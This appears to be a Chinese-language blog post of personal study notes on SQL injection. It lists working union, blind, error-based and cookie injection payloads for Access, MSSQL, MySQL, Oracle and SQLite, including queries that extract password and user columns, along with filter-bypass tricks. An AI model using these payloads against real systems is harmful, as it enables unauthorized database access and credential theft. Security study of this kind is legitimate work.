<!DOCTYPE html>
<html lang>
  <head><meta name="generator" content="Hexo 3.9.0">
    
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



  <meta name="description" content="Sql注入">




  <meta name="keywords" content="sql注入,">





  <link rel="alternate" href="/default" title="Hades">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">



<link rel="canonical" href="http://yoursite.com/2019/08/10/SQL注入/">


<meta name="description" content="SQL注入1.常见的几种数据库数据库accessmssqlmysqlsqlseveroraclesqlite2.注入方法和流程Access逐字猜解法： 猜表名：exists 指定一个子查询 返回值为布尔类型 eg：and exists（子查询） 猜列名：and （select top 1 len （列名）from 表名 ）&amp;gt;n 联合查询： order by 判断字段 union select">
<meta name="keywords" content="sql注入">
<meta property="og:type" content="article">
<meta property="og:title" content="Sql注入">
<meta property="og:url" content="http://yoursite.com/2019/08/10/SQL注入/index.html">
<meta property="og:site_name" content="Hades">
<meta property="og:description" content="SQL注入1.常见的几种数据库数据库accessmssqlmysqlsqlseveroraclesqlite2.注入方法和流程Access逐字猜解法： 猜表名：exists 指定一个子查询 返回值为布尔类型 eg：and exists（子查询） 猜列名：and （select top 1 len （列名）from 表名 ）&amp;gt;n 联合查询： order by 判断字段 union select">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/3.png">
<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4.png">
<meta property="og:updated_time" content="2019-09-09T03:42:14.508Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Sql注入">
<meta name="twitter:description" content="SQL注入1.常见的几种数据库数据库accessmssqlmysqlsqlseveroraclesqlite2.注入方法和流程Access逐字猜解法： 猜表名：exists 指定一个子查询 返回值为布尔类型 eg：and exists（子查询） 猜列名：and （select top 1 len （列名）from 表名 ）&amp;gt;n 联合查询： order by 判断字段 union select">
<meta name="twitter:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/3.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">


  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css">




<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: ture
    },
  };
</script>




  



    <title> Sql注入 - Hades </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Hades</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/life">
                            
                            
                                Life
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Sql注入
        
      </h1>

      <time class="post-time">
          8月 10 2019
      </time>
    </header>



    
            <div class="post-content">
            <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-常见的几种数据库数据库"><a href="#1-常见的几种数据库数据库" class="headerlink" title="1.常见的几种数据库数据库"></a>1.常见的几种数据库数据库</h2><h3 id="access"><a href="#access" class="headerlink" title="access"></a>access</h3><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="sqlsever"><a href="#sqlsever" class="headerlink" title="sqlsever"></a>sqlsever</h3><h3 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h3><h3 id="sqlite"><a href="#sqlite" class="headerlink" title="sqlite"></a>sqlite</h3><h2 id="2-注入方法和流程"><a href="#2-注入方法和流程" class="headerlink" title="2.注入方法和流程"></a>2.注入方法和流程</h2><h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><p>逐字猜解法：</p>
<p>猜表名：exists 指定一个子查询 返回值为布尔类型</p>
<p>eg：and exists（子查询）</p>
<p>猜列名：and （select top 1 len （列名）from 表名 ）&gt;n</p>
<p>联合查询：</p>
<p>order by 判断字段</p>
<p>union select 判断显示位</p>
<p>偏移注入：</p>
<p>判断字段数，判断表名，使用*号从后开始代替显示位 </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,* from admin</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,* from admin</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,* from admin</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,* from admin</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,* from admin</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>

<h3 id="Mssql（Sqlsevre）"><a href="#Mssql（Sqlsevre）" class="headerlink" title="Mssql（Sqlsevre）"></a>Mssql（Sqlsevre）</h3><p>权限：sa/db db_ower/public/</p>
<p>判断数据库类型:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ecists (<span class="keyword">select</span> * <span class="keyword">from</span> sysobjects)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> sysobjects)</span><br></pre></td></tr></table></figure>

<p>判断数据库版本：</p>
<p>有回显：and =@@version()</p>
<p>无回显：and substr（(select @@version),22,4）</p>
<p>判断字段数：order by… / union all select null,不会自动去掉重复 使用时将前查询屏蔽/union自动去重</p>
<p>找回显位：使用null 有字符型和数字型</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxxxxxxxxx/new</span>_list.asp?id=-<span class="number">2</span>](<span class="symbol">http:</span>/<span class="regexp">/219.153.49.228:45660/new</span>_list.asp?id=-<span class="number">2</span>) <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> <span class="title">null</span>,(<span class="title">select</span> <span class="title">password</span> <span class="title">from</span> <span class="title">manage</span>),<span class="title">null</span>,<span class="title">null</span></span></span><br></pre></td></tr></table></figure>

<p>爆库名：db_name()  db_name(1)</p>
<p>爆表名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union all <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span>),<span class="string">'3'</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'manage'</span>)),<span class="string">'3'</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'manage'</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">dbo.sysobjects//存储对象可爆破表  xtype=<span class="string">'u'</span>  //查看用户表</span><br></pre></td></tr></table></figure>

<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>mysql常用语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>（）<span class="comment">#查看mysql版本</span></span><br><span class="line"><span class="keyword">select</span> @@global.version_compile_Os <span class="comment">#查看当前系统</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>（）<span class="comment">#查看使用者</span></span><br><span class="line"><span class="keyword">select</span> @@basedir（）<span class="comment">#查询数据库所在位置 可在phpmyadmin提权时获取日志目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>() <span class="comment">#查询是否选择了数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#查询数据库</span></span><br><span class="line"><span class="keyword">use</span> databases_name; <span class="comment">#选择数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; <span class="comment">#查询选择的数据库的表</span></span><br><span class="line">desc 表名; <span class="comment">#查询一个表的结构</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">databases</span> 数据库名; <span class="comment">#创建数据库</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">databases</span> 数据库名; <span class="comment">#删除数据库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [ <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> ] <span class="string">`表名`</span>（</span><br><span class="line">    <span class="string">`字段名`</span>  数据类型  数据属性,</span><br><span class="line">    <span class="string">`字段名`</span>  数据类型  数据属性,</span><br><span class="line">    <span class="string">`字段名`</span>  数据类型  数据属性,</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">`字段名`</span>  数据类型  数据属性 (最后一个字段分隔符, 不能加)</span><br><span class="line">）<span class="keyword">engine</span>=数据库引擎 <span class="keyword">default</span> <span class="keyword">charset</span>=编码类型;    <span class="comment">#创建数据表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> new_table <span class="keyword">like</span> old_tabe 根据存在的表建立新表；</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> 字段 属性   <span class="comment">#表中插入字段</span></span><br></pre></td></tr></table></figure>

<p>mysql中表的属性：</p>
<p>数据属性: </p>
<ol>
<li>主键索引 primary key(唯一,一张表推荐一个主键) </li>
<li>唯一索引 unique(唯一) 主要目的 : 避免数据重复 , 附带提高查询速度 缺点 : 占用磁盘空间 </li>
<li>自增 auto_increment </li>
<li>非空约束not null (不能为空) </li>
<li>默认值 default 值 注: 数据属性不写, 默认为 null </li>
<li>描述 comment ‘描述内容’ </li>
<li>无符号 unsigned(非负限定 ,即不能取负值) 取值范围 0–255</li>
</ol>
<p>mysql增删改查：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">插入 <span class="keyword">insert</span> <span class="keyword">into</span> 表名() <span class="keyword">values</span> ()  </span><br><span class="line">删除 <span class="keyword">delete</span> <span class="keyword">from</span> 表名 () <span class="keyword">where</span> 限制条件/  <span class="keyword">truncate</span> <span class="keyword">table</span> 表名/</span><br><span class="line">改正 <span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名=值<span class="number">1</span> 、字段名=值<span class="number">2</span> whele 限制条件</span><br><span class="line">查找 <span class="keyword">select</span> * / 字段名 <span class="keyword">from</span> 表名  </span><br><span class="line"><span class="keyword">where</span> +<span class="keyword">in</span>/<span class="keyword">not</span>/<span class="keyword">and</span>/<span class="keyword">or</span>/<span class="keyword">between</span> <span class="keyword">and</span>  限制条件  </span><br><span class="line"><span class="keyword">distinct</span> 过滤重复字段   <span class="keyword">select</span> <span class="keyword">distinct</span> 字段名 <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">like</span> 匹配字符串  </span><br><span class="line">%通配符  （使用/转义） _单个匹配  </span><br><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">like</span> ‘匹配字符串’</span><br></pre></td></tr></table></figure>

<p>mysql基本函数：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">count(*) 计数    <span class="keyword">and</span> 比<span class="keyword">or</span> 优先级高  </span><br><span class="line">select count(字段) <span class="keyword">from</span> 表 where 限制条件;</span><br><span class="line">sum(*)   avg(*)   max(*)    min(*)</span><br><span class="line">order by [asc]升序/ [desc]降序   </span><br><span class="line">select <span class="number">*f</span>rom<span class="built_in"> user </span>order by id;</span><br><span class="line">group by  按组排序 重复的限制条件归为一组 只显示一个 </span><br><span class="line">select count(*) <span class="keyword">from</span><span class="built_in"> user group </span>by sex; </span><br><span class="line">group by 和聚合函数一起使用，可以统计出某些字段在一个分组中的特殊值 和having一起使用 （having和where类似 只是where不能和聚合函数使用）</span><br><span class="line">eg:select sun(grade),gender <span class="keyword">from</span> student2<span class="built_in"> group </span>by gender having sum(grade)&lt;300 #将student2表按照garde字段进行分组查询，查询出garde字段值小于300的</span><br><span class="line">limit [offset].记录数  select <span class="number">*f</span>rom<span class="built_in"> user </span>limit 0,1;</span><br><span class="line">as 取别名 只能是字符串类型 不能是int类型</span><br><span class="line">union 联合查询  只能相同表结构的使用union查询 不相同的会报错 会自动去重 不想自动去重可使用 union all</span><br><span class="line">select rand （） 生成0-1直接随机数</span><br><span class="line">selcet floor （）向下取整</span><br><span class="line">select concat（） 拼接 字符串/16进制</span><br><span class="line">select concat_ws （分隔符 拼接数据1 拼接数据2）</span><br><span class="line">extractvalue（xml文档名字 xml文档路径） 对xml文档查询</span><br><span class="line">sleep（）对数据库进行延时的函数 默认秒</span><br><span class="line">updatexml （目标xml文档 xml路径 更新的内容）</span><br><span class="line">exp （）此函数返回e的x次方的值 </span><br><span class="line">length （） 返回参数的长度</span><br><span class="line">substr /substring（字符串 起始位置 结束位置） 从字符串s的位置截取长度为length的字符串</span><br><span class="line">acsill （）ord（） 返回字符的ascill码 用于盲注</span><br><span class="line">name_conset （字段名 值） 构造一个列</span><br><span class="line">strcmp （） 比较字符串 相同为0 不同为1或-1</span><br><span class="line"><span class="keyword">if</span> （a，b，c）a为真 返回b 否则返回c</span><br><span class="line">benchmark （count expr） 重复计算expr表达式count次 无返回值 构造延时</span><br><span class="line">locate （substr str） /position （substr <span class="keyword">in</span> str） 返回substr字符串在str中的位置  没有返回0</span><br><span class="line">instr （） 与locate/postion 参数位置相反</span><br></pre></td></tr></table></figure>

<p>mysql内置表：</p>
<p>在mysql5.0以上版本内置了information_schema数据库，包含40张表，可利用此库注入取得表名和相关数据。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schamata; <span class="comment">#查询所有数据库名</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables；<span class="comment">#查询所有表名</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns; <span class="comment">#查询所有列名</span></span><br></pre></td></tr></table></figure>

<p>mysql注入：</p>
<p>判断注入方式：</p>
<ul>
<li>单引号报错</li>
<li>and 1=1 / and 1=2</li>
<li>1+1 / 1-1</li>
<li>or 1=1 / or 1=2</li>
</ul>
<p>几种注入方式：</p>
<p>数字型注入：  http：//xxx.com/news.php?id=x</p>
<p>字符型注入：  http：//<a href="http://xxx.com/news.php?id=x" target="_blank" rel="noopener">xxx.com/news.php?</a>name=’admin’</p>
<p>搜索型注入：  get/post </p>
<p>根据提交方式注入： get/ post/ cookie/ http头</p>
<p>执行效果注入：   布尔/时间/报错/联合查询/堆查询</p>
<p>基本流程：</p>
<p>判错  &gt;&gt;  查询字段数  &gt;&gt;  union select  &gt;&gt;  数据库 表名 字段名</p>
<p>盲注：</p>
<p>基于布尔的盲注：</p>
<p>利用函数构造布尔值返回，判断信息。 eg：substr(version(),2,1)=0 </p>
<p>基于时间的盲注：</p>
<p>使用if等构造逻辑判断，根据返回时间判断信息。 eg：if(substr(version()1,1)= 5,sleep(10),1）</p>
<p>基于报错的注入：</p>
<ul>
<li>bigint等数据类型溢出</li>
</ul>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)+<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/3.png" alt="2"></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br></pre></td></tr></table></figure>

<p>~的意思为按位取反，如~0 = 18446744073709551615 大于5.5.53不可用</p>
<ul>
<li>主键重复</li>
<li>列名重复</li>
<li>几何函数报错</li>
</ul>
<p>联合查询注入</p>
<p>堆查询注入</p>
<p>基于请求的注入：</p>
<ul>
<li>GET请求注入</li>
<li>POST请求注入</li>
<li>Cookie注入</li>
</ul>
<p>1.去掉id=</p>
<p>2.加入javascript:alert(document.cookie=”id=”+escape(“xx”));语句</p>
<p>3.更改xx为id的值 后返回没有id=的页面 观察内容是否相同 相同则为可能有cookie注入</p>
<ul>
<li>xff注入（http头注入）</li>
</ul>
<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4.png" alt="1"></p>
<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>判断是否为oracle 数据库</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count<span class="comment">(*) from user_tables)&gt;0</span></span><br><span class="line"><span class="comment">and (select count(*)</span> <span class="keyword">from</span> dual) &gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>爆版本信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union all <span class="keyword">select</span> <span class="keyword">chr</span>(<span class="number">94</span>)||<span class="keyword">chr</span>(<span class="number">94</span>)||<span class="keyword">chr</span>(<span class="number">94</span>)||banner||<span class="keyword">chr</span>(<span class="number">94</span>)||<span class="keyword">chr</span>(<span class="number">94</span>)||<span class="keyword">chr</span>(<span class="number">94</span>),<span class="literal">null</span>  <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> r,banner <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> r,banner <span class="keyword">from</span> v$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>&lt;=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="keyword">desc</span>) t <span class="keyword">where</span> r&gt;<span class="number">1</span><span class="number">-1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>)t <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>爆数据库名</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'null'</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum=<span class="number">1</span>) <span class="keyword">from</span> dual   <span class="comment">//dual 内置表</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'null'</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum=<span class="number">1</span> <span class="keyword">and</span> owner&lt;&gt;<span class="string">'first_dbname'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'null'</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum=<span class="number">1</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'null'</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'LOGMNR_SESSION_EVOLVE$'</span> <span class="keyword">and</span> rownum=<span class="number">1</span>) <span class="keyword">from</span> dual</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'null'</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'LOGMNR_SESSION_EVOLVE$'</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'BRANCH_LEVEL'</span> <span class="keyword">and</span> rownum=<span class="number">1</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> '1','用户名：'||<span class="title">USER_NAME</span>||'密码：'||<span class="title">USER_PWD</span>||'状态：'||<span class="title">STATUS</span> <span class="title">from</span> "<span class="title">sns_users</span>"</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h3><p>猜字段 order by</p>
<p>爆表名 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+UNION+<span class="keyword">SELECT</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(tbl_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span>=<span class="string">'table'</span> <span class="keyword">and</span> tbl_name <span class="keyword">NOT</span> <span class="keyword">like</span> <span class="string">'sqlite_%'</span></span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">sql</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span>!=<span class="string">'meta'</span> <span class="keyword">AND</span> <span class="keyword">sql</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">AND</span> <span class="keyword">name</span> <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'sqlite_%'</span> <span class="keyword">AND</span> <span class="keyword">name</span> =<span class="string">'notice_sybase'</span></span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">SELECT</span> 1,<span class="title">title</span>,<span class="title">time</span>,4 <span class="title">FROM</span> <span class="title">notice_sybase</span></span></span><br></pre></td></tr></table></figure>

<p>Sql注入中的绕过：</p>
<p>以mysql数据库为例</p>
<p>new_id=1①union②select③1，2,db_name(),④from⑤admin</p>
<p>位置1 </p>
<p>其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0</p>
<p>利用注释符号  /* */ #test%0d%0a –+a</p>
<p>利用数学运算以及数据类型 </p>
<p>news_id=1.1 </p>
<p>new_id=1E0 </p>
<p>news_id=\N</p>
<p>位置2</p>
<p>可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
<p>利用注释符号 /* */ #test%0d%0a –+a</p>
<p>可利用括号 union （select 1,2）</p>
<p>位置3</p>
<p>其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0 </p>
<p>利用注释符号  /* */ #test%0d%0a –+a</p>
<p>可利用其他符号：+ - ~ ！ @</p>
<p>位置4</p>
<p>可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
<p>利用注释符号 /* */ #test%0d%0a –+a</p>
<p>可利用数学运算以及数据类型：union select user(),2 0 from admin</p>
<p>union select user(),8eofrom admin</p>
<p>union select user(),\Nfrom admin</p>
<p>位置5</p>
<p>可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
